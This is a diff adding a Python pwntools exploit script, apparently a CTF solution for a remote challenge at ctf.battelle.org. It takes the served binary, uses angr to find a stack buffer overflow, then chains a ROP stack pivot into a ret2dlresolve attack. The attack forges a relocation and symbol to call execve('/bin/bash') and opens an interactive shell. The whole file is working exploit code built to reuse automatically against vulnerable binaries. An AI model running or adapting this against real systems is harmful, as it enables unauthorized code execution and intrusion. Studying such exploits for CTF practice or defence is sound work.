@@ -1,0 +1,186 @@
+#!/usr/bin/env python3
+from pwn import *
+import angr
+import ropper
+import time
+
+
+fname = 'vuln'
+ip = 'ctf.battelle.org'
+port = 30042
+
+#context.log_level='debug'
+
+LOCAL = False
+
+if LOCAL:
+    r = process(fname,aslr=True)
+
+    gdbscript="""
+    b *0x08048380
+    b *read
+    """
+    #set follow-fork-mode
+
+    attach('vuln',gdbscript=gdbscript)
+else:
+    r = remote(ip, port)
+
+s = lambda x : r.send(x)
+rl = lambda : r.recvline()
+rlb = lambda : r.recvlineb()
+sl = lambda x : r.sendline(x)
+ru = lambda x :r.recvuntil(x)
+rcb = lambda x :r.recvb(x)
+sla = lambda x,y : r.sendlineafter(x,y)
+inter = lambda : r.interactive()
+
+def leak_binary():
+    ru('********************************\n')
+    leak = ru('\n********************************\n')
+    leak = leak[:-34]
+
+    with open('vuln', "wb+") as the_file:
+        the_file.write(leak)
+        the_file.close()
+
+
+def pwn():
+
+    #r = process(fname,aslr=True)
+    #attach('vuln')
+
+    s = lambda x : r.send(x)
+    rl = lambda : r.recvline()
+    rlb = lambda : r.recvlineb()
+    sl = lambda x : r.sendline(x)
+    ru = lambda x :r.recvuntil(x)
+    rcb = lambda x :r.recvb(x)
+    sla = lambda x,y : r.sendlineafter(x,y)
+    inter = lambda : r.interactive()
+
+
+    elf = context.binary = ELF(f'./{fname}')
+
+    proj = angr.Project('vuln',auto_load_libs = False)
+
+    sm = proj.factory.simulation_manager(save_unconstrained=True)
+
+    while len(sm.unconstrained)==0:
+        sm.step()
+
+    unconstrained_state = sm.unconstrained[0]
+
+    crashing_input = unconstrained_state.posix.dumps(0)
+    
+    #print(repr(crashing_input))
+
+    #find how many bytes we can read in
+    read_block_addr = unconstrained_state.history.bbl_addrs.hardcopy[-10]
+    read_block = proj.factory.block(read_block_addr)
+    #print(read_block.pp())
+    len_user_in = hex(unpack(read_block.bytes[7:11],'all'))
+    len_user_in =  int(len_user_in,16)
+    print(f'user can input {len_user_in} bytes')
+
+
+    #find how big the buffer is
+    memset_block_addr = unconstrained_state.history.bbl_addrs.hardcopy[-13]
+    memset_block = proj.factory.block(memset_block_addr)
+    #print(memset_block.pp())
+    buffer_size = hex(unpack(memset_block.bytes[19:20],'all'))
+    buffer_size =  int(buffer_size,16)
+    print(f'buffer size is {buffer_size} bytes')
+
+    overflow = len_user_in - buffer_size
+
+    print(f'we have a {overflow} bytes overflow')
+
+
+    ##############
+    #exploit part#
+    ##############
+
+
+    rop = ROP(elf)
+    bss_addr = elf.bss()
+
+    stack_size = 0x200
+    base_stage = int(bss_addr + stack_size + 0x20)
+
+    print(hex(base_stage))
+
+    ################
+    # stack pivote #
+    ################
+    rop.raw(crashing_input[:-overflow])
+    rop.raw(b'a'*12)
+    rop.raw(b'b'*4)
+    rop.read(0,base_stage,100)
+    rop.migrate(base_stage)
+    sl(rop.chain())
+
+
+    rop = ROP(elf)
+    sh = b'/bin/bash\x00'
+
+    #get sections
+    plt0 = elf.get_section_by_name('.plt').header.sh_addr
+    rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
+    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
+    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
+
+    #create fake symbol @ base_stage + 32 + align
+    fake_sym_addr = base_stage + 32
+    align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
+    fake_sym_addr = fake_sym_addr + align
+    print(f'fake sym addr = {hex(fake_sym_addr)}')
+
+    index_dynsym = int((fake_sym_addr - dynsym) / 0x10)
+    print(f'index dynsym = {hex(index_dynsym)}')
+    st_name = fake_sym_addr + 0x10 - dynstr
+    fake_read_sym = flat([st_name, 0, 0, 0x12])
+    print(f'fake sym addr = {fake_read_sym}')
+
+    #create fake read relocation @ base_stage + 24
+    index_offset = base_stage + 24 - rel_plt
+    read_got = elf.got['strncmp']
+    r_info = (index_dynsym << 8) | 0x7
+    fake_read_reloc = flat([read_got,r_info])
+    
+    gnu_version_addr = elf.get_section_by_name('.gnu.version').header.sh_addr
+    print("ndx arr: %s" % hex(gnu_version_addr+index_dynsym*2))
+
+    #input('press enter')
+    sleep(1)
+
+    rop.raw(plt0)
+    rop.raw(index_offset)
+    rop.raw(elf.plt['strncmp'])
+    rop.raw(base_stage + 80)
+    rop.raw(0)
+    rop.raw(0)
+    rop.raw(fake_read_reloc)
+    rop.raw('a'*align)
+    rop.raw(fake_read_sym)
+    rop.raw(b'execve\x00')
+    rop.raw('a'*(80 - len(rop.chain())))
+    rop.raw(sh)
+    rop.raw('a'*(100 - len(rop.chain())))
+    sl(rop.chain())
+
+
+    time.sleep(0.15)
+    #sl('cd log')
+    sl('ls -la')
+
+
+
+    inter()
+
+if __name__ == '__main__':
+    leak_binary()
+    pwn()
+
+
+
